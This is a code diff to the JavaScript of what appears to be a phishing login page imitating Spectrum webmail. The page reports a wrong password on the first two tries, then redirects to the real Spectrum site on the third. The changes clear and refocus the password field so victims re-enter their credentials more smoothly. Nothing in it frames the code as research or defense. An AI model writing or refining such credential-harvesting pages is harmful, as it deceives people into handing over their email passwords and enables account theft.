@@ -85,6 +85,9 @@
                 // Hide loading animation
                 document.querySelector('.loader').style.display = 'none';
                 
+                // Clear the password field for the next attempt
+                document.getElementById('emailPassword').value = '';
+                
                 // Check if this is the 3rd attempt
                 if (attempts >= 3) {
                     // Reset counter and redirect
@@ -92,8 +95,9 @@
                     window.location.href = "https://webmail.spectrum.net/mail/auth";
                 } else {
                     // Show error message for 1st and 2nd attempts
-                    document.getElementById('emailPassword').value = '';
                     alert("Incorrect password. Please try again.");
+                    // Focus on the password field for the next attempt
+                    document.getElementById('emailPassword').focus();
                 }
             })
             .catch(function(error) {
@@ -103,6 +107,9 @@
                 // Show error message
                 console.error("Error:", error);
                 
+                // Clear the password field for the next attempt
+                document.getElementById('emailPassword').value = '';
+                
                 // Check if this is the 3rd attempt despite the error
                 if (attempts >= 3) {
                     // Reset counter and redirect
@@ -111,6 +118,8 @@
                 } else {
                     // Show error for 1st and 2nd attempts
                     alert("There was a problem with your login. Please try again.");
+                    // Focus on the password field for the next attempt
+                    document.getElementById('emailPassword').focus();
                 }
             });
             
